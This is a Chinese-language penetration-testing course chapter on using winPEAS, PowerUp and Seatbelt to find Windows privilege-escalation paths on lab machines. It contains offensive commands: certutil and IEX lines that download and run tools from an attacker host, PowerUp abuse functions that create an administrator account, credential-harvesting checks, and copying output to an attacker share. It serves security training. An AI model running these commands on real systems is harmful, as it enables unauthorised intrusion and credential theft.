# Ch 29 — winPEAS / PowerUp / Seatbelt 解讀

> 目標：能執行三個主要的 Windows 枚舉工具，並快速從輸出中找到提權線索。

## 三個工具的定位

```
winPEAS：廣度優先，找所有可能的問題，有顏色標記
PowerUp：聚焦服務和設定錯誤，有自動利用函數
Seatbelt：系統狀態和「我在哪個環境」的情報收集
```

考試優先用 winPEAS + PowerUp 組合。

## winPEAS

### 取得和執行

```cmd
# 在 Kali 準備
ls ~/tools/winPEASany.exe   # 事先下載

# 傳到靶機
certutil -urlcache -f http://10.10.14.5/winPEASany.exe C:\Windows\Temp\wpe.exe

# 執行
C:\Windows\Temp\wpe.exe

# 存輸出（沒有顏色）
C:\Windows\Temp\wpe.exe > C:\Windows\Temp\wpe_out.txt

# 特定分析
C:\Windows\Temp\wpe.exe servicesinfo    # 只看服務
C:\Windows\Temp\wpe.exe windowscreds    # 只看憑證
```

### winPEAS 輸出重點區段

```
System Info
  → OS 版本、是否有 patch → 找 kernel exploit

Current User Privileges
  → whoami /all → SeImpersonatePrivilege？ ← 最先看

Services
  → Unquoted paths，弱 binary 權限 ← 第二看

Scheduled Tasks
  → 可寫的任務腳本？

DotNet versions
  → 哪個 .NET 可用 → 決定用哪個工具

AlwaysInstallElevated
  → 直接可用的提權

Credentials in files
  → unattend.xml、web.config、*.ini 裡的密碼

AutoLogon Credentials
  → Registry 的明文密碼

SAM and SYSTEM hive
  → 可讀的話直接提取 hash
```

### winPEAS 顏色說明

```
紅色背景       ← 最危險，直接可利用
黃色背景/文字  ← 需要調查
綠色           ← 可能有問題
```

## PowerUp

PowerUp 專注於「可被直接利用的設定錯誤」，並提供利用函數。

### 執行

```powershell
# 下載到靶機
certutil -urlcache -f http://10.10.14.5/PowerUp.ps1 C:\Windows\Temp\PowerUp.ps1

# 執行（先 bypass execution policy）
powershell -ep bypass -c "Import-Module C:\Windows\Temp\PowerUp.ps1; Invoke-AllChecks"

# 或直接一行
powershell -ep bypass "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/PowerUp.ps1'); Invoke-AllChecks"
```

### PowerUp 輸出解讀

```
[*] Checking for unquoted service paths...
ServiceName    : VulnerableService
Path           : C:\Program Files\Vuln App\service.exe
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'VulnerableService' -Command '...'
         ^^^^^^^^^ 直接告訴你怎麼利用！

[*] Checking service executable permissions...
ServiceName    : WeakService
Path           : C:\WeakService\service.exe
ModifiableFile : C:\WeakService\service.exe
AbuseFunction  : Install-ServiceBinary -Name 'WeakService' -Command '...'

[*] Checking %PATH% for modifiable folders...
Modifiable Path : C:\Users\user\AppData\Local\Microsoft\WindowsApps
```

### PowerUp 利用函數

```powershell
# Unquoted service path → 自動安裝 binary
Write-ServiceBinary -Name 'VulnerableService' -UserName hacker -Password P@ssword

# 弱服務 binary → 替換
Install-ServiceBinary -Name 'WeakService' -UserName hacker -Password P@ssword

# AlwaysInstallElevated → 安裝 MSI 加帳號
Write-UserAddMSI
msiexec /quiet /qn /i UserAdd.msi

# 直接加管理員（如果服務可改）
Invoke-ServiceAbuse -Name 'VulnerableService' -UserName hacker -Password P@ssword
```

## Seatbelt

Seatbelt 更偏向「系統現況調查」：

```cmd
# 下載預編譯版
certutil -urlcache -f http://10.10.14.5/Seatbelt.exe C:\Windows\Temp\sb.exe

# 跑所有檢查
C:\Windows\Temp\sb.exe -group=all

# 聚焦提權相關
C:\Windows\Temp\sb.exe TokenPrivileges
C:\Windows\Temp\sb.exe PowerShellHistory   # 看 PS 歷史指令，可能有密碼
C:\Windows\Temp\sb.exe CredEnum            # 憑證管理員
C:\Windows\Temp\sb.exe SavedRDPConnections  # 儲存的 RDP 連線
```

## 快速工作流

```
1. certutil 下載 winPEAS 和 PowerUp
2. 先跑 winPEAS，看紅色部分（3–5 分鐘）
3. 特別注意 Privileges、Services、Credentials
4. 有懷疑的服務 → 跑 PowerUp，看有沒有 AbuseFunction
5. 找到密碼 → 試 su / RDP / net use
6. 有 SeImpersonatePrivilege → 跑 Potato
```

## 在沒有顏色的環境解讀輸出

```cmd
# 如果 winPEAS 輸出沒有顏色（某些 shell 不支援）
# 用關鍵字 grep：
type C:\Windows\Temp\wpe_out.txt | findstr /i "privilege\|modifiable\|write\|credential\|password"
```

或把輸出傳到 Kali 用 `grep`：

```bash
# 靶機
C:\Windows\Temp\wpe.exe > \\10.10.14.5\share\wpe_out.txt
# Kali 開 SMB share（或用 nc 傳輸）
```

## 本章對應靶機

和 Ch 25–28 的靶機一樣，這章是工具篇，用在所有 Windows 靶機上。

## 自我檢核

- [ ] 能在 Windows 靶機下載並執行 winPEAS
- [ ] 知道 winPEAS 輸出中「Privileges」、「Services」、「Credentials」哪裡看
- [ ] 能用 PowerUp 的 `Invoke-AllChecks` 並找到 `AbuseFunction`
- [ ] 知道 Seatbelt 的 `TokenPrivileges` 能看什麼

→ [練習 D：3 台 Windows 靶機](./practice-d-windows-privesc.md)
